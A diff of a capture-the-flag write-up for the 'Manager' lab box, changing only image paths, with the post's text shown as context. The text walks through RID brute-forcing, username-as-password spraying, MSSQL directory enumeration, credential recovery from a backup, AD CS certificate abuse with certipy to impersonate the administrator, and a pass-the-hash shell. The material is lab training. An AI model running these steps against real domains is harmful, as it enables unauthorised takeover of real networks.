@@ -107,7 +107,7 @@ $ nxc smb manager.htb -u 'Guest' -p '' --rid-brute > ridbrute.txt
 $ cat ridbrute.txt | awk -F'\\' '{print $2}' | awk '{print $1}' > validusers.txt
 ```
 
-![](../assets/img/2026-03-11-Manager/1.png)
+![](/assets/img/2026-03-11-Manager/1.png)
 
 At this point, I would usually test if these accounts have Kerberos pre-authentication disabled and attempt to AS-REP Roast them, however I'd like to enumerate all other services beforehand.
 
@@ -122,7 +122,7 @@ $ nxc mssql manager.htb -u 'Guest' -p ''
 $ ldapsearch -H ldap://dc01.manager.htb -x -b "DC=manager,DC=htb"
 ```
 
-![](../assets/img/2026-03-11-Manager/2.png)
+![](/assets/img/2026-03-11-Manager/2.png)
 
 As we already have a list of users, I test to see if any accounts have usernames reused as their password. This shows that this is the case for the 'operator' account, don't mind the SQLServer machine account since it authenticates as Guest.
 
@@ -130,7 +130,7 @@ As we already have a list of users, I test to see if any accounts have usernames
 $ nxc smb manager.htb -u validusers.txt -p validusers.txt --continue-on-success --no-brute
 ```
 
-![](../assets/img/2026-03-11-Manager/3.png)
+![](/assets/img/2026-03-11-Manager/3.png)
 
 ## MSSQL Enumeration
 Checking if this is also works for MSSQL shows that we're allowed to make queries via tools like Impacket's [mssqlclient.py](https://github.com/Twi1ight/impacket/blob/master/examples/mssqlclient.py) script. Displaying the database names reveals four, however these are all the defaults. 
@@ -141,7 +141,7 @@ $ impacket-mssqlclient -windows-auth manager.htb/operator:operator@manager.htb
 SQL (MANAGER\Operator  guest@master)> select name from master..sysdatabases;
 ```
 
-![](../assets/img/2026-03-11-Manager/4.png)
+![](/assets/img/2026-03-11-Manager/4.png)
 
 Dumping these will return nothing, but that doesn't mean that this service is useless. MSSQL has the `xp_cmdshell` feature, which is primarily used by administrators for tasks like file management, interacting with the OS, or running system scripts. If enabled, we can execute commands on behalf of 'operator' and get a reverse shell.
 
@@ -151,7 +151,7 @@ SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami
 SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell
 ```
 
-![](../assets/img/2026-03-11-Manager/5.png)
+![](/assets/img/2026-03-11-Manager/5.png)
 
 ### Finding Zip File with xp_dirtree
 Unfortunately, we don't have access to use or enable it and some research shows that it's disabled by default due to critical security reasons. A bit more digging on MSSQL functionality shows another feature named `xp_dirtree` that allows users to list directories directly from the CLI. It's commonly used as a verify file existence on the system, however we can use it to find hidden files.
@@ -162,7 +162,7 @@ SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\Users\raven
 SQL (MANAGER\Operator  guest@master)> xp_dirtree C:\inetpub\wwwroot
 ```
 
-![](../assets/img/2026-03-11-Manager/6.png)
+![](/assets/img/2026-03-11-Manager/6.png)
 
 Checking the `C:\Users` directory shows only one other user on the box named Raven, but we're denied access with current privileges. Another good place to check is the servers webroot directory which will show all files that we could potentially get.
 
@@ -177,22 +177,22 @@ $ mkdir zipfiles && cd zipfiles
 $ 7z x ../website-backup-27-07-23-old.zip
 ```
 
-![](../assets/img/2026-03-11-Manager/7.png)
+![](/assets/img/2026-03-11-Manager/7.png)
 
 Listing all files shows an old XML configuration file for LDAP that was hidden; Dumping the contents gives us user credentials for Raven.
 
-![](../assets/img/2026-03-11-Manager/8.png)
+![](/assets/img/2026-03-11-Manager/8.png)
 
 I was hoping that this password was still valid since we found it in an old backup file, but authenticating over SMB succeeds. Turns out that they are in the Remote Management group, meaning we can WinRM onto the box to grab a shell.
 
-![](../assets/img/2026-03-11-Manager/9.png)
+![](/assets/img/2026-03-11-Manager/9.png)
 
 At this point we can grab the user flag under their Desktop folder and start internal enumeration to escalate privileges towards Administrator.
 
 ## Privilege Escalation
 Listing our account information with `whoami /all` shows that we are in the Certificate Service DCOM Access group, which reveals that Active Directory Certificate Services (AD CS) is installed on this box too.
 
-![](../assets/img/2026-03-11-Manager/10.png)
+![](/assets/img/2026-03-11-Manager/10.png)
 
 ### Enumerating AD CS
 I'll  use [Certipy-AD](https://github.com/ly4k/Certipy) to test if Raven has the capability to issue certificates or manage the CA.
@@ -282,7 +282,7 @@ $ certipy-ad ca -ca manager-DC01-CA -dc-ip 10.129.5.12 -u 'raven' -p '[REDACTED]
 $ certipy-ad ca -ca manager-DC01-CA -dc-ip 10.129.5.12 -u 'raven' -p '[REDACTED]' -enable-template SubCA
 ```
 
-![](../assets/img/2026-03-11-Manager/11.png)
+![](/assets/img/2026-03-11-Manager/11.png)
 
 Next, we want to request a certificate with the SubCA template, specifying the User Principle Name (UPN) to be the domain's administrator. This should fail, however we need to save the private key to our local machine for use in later requests.
 
@@ -292,7 +292,7 @@ $ certipy-ad req -ca manager-DC01-CA -dc-ip 10.129.5.12 \
 -target dc01.manager.htb -upn administrator@manager.htb 
 ```
 
-![](../assets/img/2026-03-11-Manager/12.png)
+![](/assets/img/2026-03-11-Manager/12.png)
 
 Then, we'll issue the previously failed certificate request with the `-issue-request` option. This is done in order for us to impersonate the Administrator upon retrieval which allows us to authenticate and grab the their NTLM hash.
 
@@ -300,7 +300,7 @@ Then, we'll issue the previously failed certificate request with the `-issue-req
 $ certipy-ad ca -ca manager-DC01-CA -dc-ip 10.129.5.12 -u 'raven' -p '[REDACTED]' -issue-request [REQUEST_ID]
 ```
 
-![](../assets/img/2026-03-11-Manager/13.png)
+![](/assets/img/2026-03-11-Manager/13.png)
 
 Now we'll run a request command along with the `-retrieve` option to grab that issued certificate, making sure to specify a UPN matching the Domain Administrator in order to impersonate them. This will save both the certificate and private key to a `.pfx` file which can be used for authentication, letting us get the NTLM as well.
 
@@ -310,7 +310,7 @@ $ certipy-ad req -ca manager-DC01-CA -dc-ip 10.129.5.12 \
 -upn administrator@manager.htb -retrieve 20
 ```
 
-![](../assets/img/2026-03-11-Manager/14.png)
+![](/assets/img/2026-03-11-Manager/14.png)
 
 Before using that `.pfx` file, we need to fix the Clock Skew error since this is Kerberos related. If you can get away with just using an ntpdate command, then go for it, but my VMWare machine overrides the clock settings, so I have to manually disabled them first.
 
@@ -331,7 +331,7 @@ After our clock is synced to the DC, we can authenticate by providing the IP and
 $ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.5.12
 ```
 
-![](../assets/img/2026-03-11-Manager/15.png)
+![](/assets/img/2026-03-11-Manager/15.png)
 
 After spawning a shell with Evil-WinRM allows us to grab the final flag under the Administrator's Desktop folder to complete this challenge.
 
@@ -339,6 +339,6 @@ After spawning a shell with Evil-WinRM allows us to grab the final flag under th
 $ evil-winrm -i dc01.manager.htb -u administrator -H '[REDACTED]'
 ```
 
-![](../assets/img/2026-03-11-Manager/16.png)
+![](/assets/img/2026-03-11-Manager/16.png)
 
 That's all y'all, I enjoyed this box as I don't typically find MSSQL to be public-facing and have little experience exploiting it. I hope this was helpful to anyone following along or stuck and happy hacking!
